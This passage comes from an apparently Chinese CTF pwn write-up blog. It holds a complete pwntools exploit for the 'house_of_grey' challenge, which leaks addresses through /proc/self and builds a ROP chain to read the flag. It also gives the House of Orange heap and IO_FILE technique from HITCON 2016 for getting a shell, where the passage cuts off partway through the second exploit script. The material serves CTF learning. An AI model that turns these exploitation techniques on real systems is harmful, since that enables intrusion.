    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#内存搜索'/proc/self/mem'来定位栈地址.</span>
        get<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span>
        text <span class="token operator">=</span> ru<span class="token punctuation">(</span><span class="token string">'1.Find something'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'/proc/self/mem'</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>
            content <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">//</span>若找到<span class="token punctuation">,</span> 切割该字符串<span class="token punctuation">,</span>获取前面的内容长度<span class="token punctuation">.</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">23</span><span class="token punctuation">:</span>
            li<span class="token punctuation">(</span><span class="token string">'not found'</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    v8_addr <span class="token operator">=</span> stack_begin_offset <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">100000</span> <span class="token operator">+</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x14</span>
    li<span class="token punctuation">(</span><span class="token string">'v8_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>v8_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

    read_ret <span class="token operator">=</span> v8_addr <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x60</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span>
    li<span class="token punctuation">(</span><span class="token string">'read_ret: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>read_ret<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="构造rop链-1"><a href="#构造rop链-1" class="headerlink" title="构造rop链"></a>构造rop链</h3><p>在这里,只能通过写入read的 ret地址, 因为只有在刚读取完成之后, 返回的地址才不会被覆盖, 其他函数修改是被覆盖的,没有效果.</p>
<pre class=" language-python"><code class="language-python">p <span class="token operator">=</span> <span class="token string">'/proc/self/mem'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_ret<span class="token punctuation">)</span>
    fid<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fd as 5</span>

    <span class="token comment" spellcheck="true">#rop</span>
    <span class="token comment" spellcheck="true">#64位中 三个参数函数的传参方式</span>
    <span class="token triple-quoted-string string">'''
    read(fd, buf, length)
    1 RDI  0x0  #fd
    2 RSI  0x7fd5ffbc3640 ◂— '/proc/self/mem' #buf
    3 RDX  0x28 #length
    '''</span>
    ret <span class="token operator">=</span> read_ret
    <span class="token comment" spellcheck="true">#open  ./flag</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_plt<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># read flag to buffer, fd is 6</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># puts flag</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># ./flag str will be replace flag{***}</span>
    <span class="token comment" spellcheck="true">#p = p64(pop_rdi_ret) + p64()</span>
    p <span class="token operator">+=</span> <span class="token string">'./flag\x00'</span>
    <span class="token comment" spellcheck="true">#db()</span>

    giv<span class="token punctuation">(</span>p<span class="token punctuation">)</span></code></pre>
<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile  <span class="token operator">=</span> <span class="token string">"house_of_grey"</span>
libFile  <span class="token operator">=</span> <span class="token string">""</span>

remoteIp <span class="token operator">=</span> <span class="token string">"111.198.29.45"</span>
remotePort <span class="token operator">=</span> <span class="token number">44908</span>

LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIB   <span class="token operator">=</span> <span class="token number">0</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span>  io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">fid</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'5.Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">loc</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'5.Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'5.Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">giv</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'5.Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'5.Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#leaking base addr</span>
    p <span class="token operator">=</span> <span class="token string">'/proc/self/maps'</span>
    fid<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    get<span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'You get something:\n'</span><span class="token punctuation">)</span>
    exe_base <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'[heap]\n'</span><span class="token punctuation">)</span>
    stack_start <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
    stack_end <span class="token operator">=</span>   int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'rw-p 00000000 00:00 0 \n'</span><span class="token punctuation">)</span>

    libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'exe_base  '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>exe_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    li<span class="token punctuation">(</span><span class="token string">'stack_start '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_start<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'stack_end   '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_end<span class="token punctuation">)</span><span class="token punctuation">)</span>

    pop_rdi_ret_offset <span class="token operator">=</span> <span class="token number">0x1823</span>
    pop_rsi_r15_ret_offset <span class="token operator">=</span> <span class="token number">0x1821</span>
    pop_rdi_ret <span class="token operator">=</span> exe_base <span class="token operator">+</span> pop_rdi_ret_offset
    pop_rsi_r15_ret <span class="token operator">=</span> exe_base <span class="token operator">+</span> pop_rsi_r15_ret_offset
    open_plt <span class="token operator">=</span> exe_base <span class="token operator">+</span> exe<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>
    read_plt <span class="token operator">=</span> exe_base <span class="token operator">+</span> exe<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> exe_base <span class="token operator">+</span> exe<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true">#position stack addr</span>
    offset <span class="token operator">=</span> <span class="token number">0xf800000</span>
    li<span class="token punctuation">(</span><span class="token string">'debug---------------'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#begin_offset ~ stack_end</span>
    stack_begin_offset <span class="token operator">=</span> stack_end <span class="token operator">-</span> offset <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">100000</span>
    li<span class="token punctuation">(</span><span class="token string">'stack_begin_offset '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_begin_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'stack_end   '</span> <span class="token operator">+</span>        hex<span class="token punctuation">(</span>stack_end<span class="token punctuation">)</span><span class="token punctuation">)</span>

    fid<span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">)</span>
    loc<span class="token punctuation">(</span>stack_begin_offset<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># searching</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        get<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span>
        text <span class="token operator">=</span> ru<span class="token punctuation">(</span><span class="token string">'1.Find something'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'/proc/self/mem'</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>
            content <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">23</span><span class="token punctuation">:</span>
            li<span class="token punctuation">(</span><span class="token string">'not found'</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


    v8_addr <span class="token operator">=</span> stack_begin_offset <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">100000</span> <span class="token operator">+</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x14</span>
    li<span class="token punctuation">(</span><span class="token string">'v8_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>v8_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

    read_ret <span class="token operator">=</span> v8_addr <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x60</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span>
    li<span class="token punctuation">(</span><span class="token string">'read_ret: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>read_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'/proc/self/mem'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_ret<span class="token punctuation">)</span>
    fid<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fd as 5</span>

    <span class="token comment" spellcheck="true">#rop</span>
    <span class="token triple-quoted-string string">'''
    3 RDX  0x28 #length
    1 RDI  0x0  #fd
    2 RSI  0x7fd5ffbc3640 ◂— '/proc/self/mem' #buffer
    '''</span>

    ret <span class="token operator">=</span> read_ret
    <span class="token comment" spellcheck="true">#open  ./flag</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_plt<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># read flag to buffer, fd is 6</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># puts flag</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># ./flag str will be replace flag{***}</span>
    <span class="token comment" spellcheck="true">#p = p64(pop_rdi_ret) + p64()</span>
    p <span class="token operator">+=</span> <span class="token string">'./flag\x00'</span>
    <span class="token comment" spellcheck="true">#db()</span>

    giv<span class="token punctuation">(</span>p<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h1><h2 id="来源-4"><a href="#来源-4" class="headerlink" title="来源"></a>来源</h2><p>2016 ctf-HITCON</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>libc: libc.2.23</p>
<p>Unbuntu16</p>
<h2 id="难度-3"><a href="#难度-3" class="headerlink" title="难度"></a>难度</h2><p>8 / 10</p>
<h2 id="保护-4"><a href="#保护-4" class="headerlink" title="保护"></a>保护</h2><pre class=" language-text"><code class="language-text">   Arch:     amd64-64-little
   RELRO:    Full RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      PIE enabled
   FORTIFY:  Enabled</code></pre>
<h2 id="简单描述-3"><a href="#简单描述-3" class="headerlink" title="简单描述"></a>简单描述</h2><p>保护全开,有添加功能和编辑功能,只能添加4次,每次添加都会malloc三次分别储存不同的信息, 可以编辑三次,没有free函数,是经典的 House Of Orange漏洞利用类型.</p>
<h2 id="vul-5"><a href="#vul-5" class="headerlink" title="vul"></a>vul</h2><pre class=" language-c"><code class="language-c">  length <span class="token operator">=</span> <span class="token function">InputNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> length <span class="token operator">></span> <span class="token number">0x1000</span> <span class="token punctuation">)</span>
    length <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">// vul</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">InputContent</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_203068<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>申请大小小于0x1000时,存在堆溢出漏洞.</p>
<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>House of orange ( modify top chunk realize free, unsoted bin attack, small bin attack, IO_FILE)</p>
<h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>使用堆溢出修改top chunk大小(按照内存对其), 再申请一个大小大于top chunk size 的chunk,然而old top chunk就会被free掉,申请一个large bin大小的chunk,由于large bin申请成功后fd_nextsize和bk_nextsize会指向自身地址,可以泄漏heap地址,然而,申请的位置也恰好含有以前所剩的main_arena信息,所以直接打印即可泄漏libc. 后面就通过unsorted bin attack修改IO_list_all为main_arena + 0x58, 然后根据small bin管理机制,修改main_arena  + 0x58处的fake IO_FILE的chain的值指向伪造的IO_FILE,而使伪造堆块满足fp-&gt;<code>_mode</code> &lt;= 0 &amp;&amp; fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 然后会调用vtable中的<code>__overflow</code> 函数,然而我们可以伪造再一个vtable,实现在调用<code>__overflow</code>的时候调用我们的函数,这里函数就改为system,传入参数需要在伪造的IO_FILE头部写入’/bin/sh\x00’然后在unsoretd bin被破坏之后再次申请时报错, 那触发异常就会打印错误信息,<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数，而 malloc_printerr<code>其实是调用</code> <code>__libc_message</code>函数之后调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>, 然后根据<code>IO_list_all</code>中的值去遍历IO_FILE调用IO_FILE 的vtable中的 <code>__overflow</code>函数指针, 然后就可以调用system 传入 ‘/bin/sh\00’ get shell</p>
<h2 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h2><h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile <span class="token operator">=</span> <span class="token string">'houseoforange'</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
<span class="token comment" spellcheck="true">#libFile = './libc64-2.19.so'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
remotePort <span class="token operator">=</span> <span class="token number">0</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
